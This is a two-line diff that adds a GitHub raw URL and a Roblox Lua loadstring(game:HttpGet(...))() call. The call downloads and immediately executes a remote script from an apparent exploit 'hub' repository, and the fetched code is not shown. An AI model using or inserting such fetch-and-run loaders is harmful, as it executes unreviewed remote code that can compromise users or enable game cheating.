@@ -1,0 +1,2 @@
+https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/refs/heads/main/v3%20test
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/refs/heads/main/v3%20test"))()
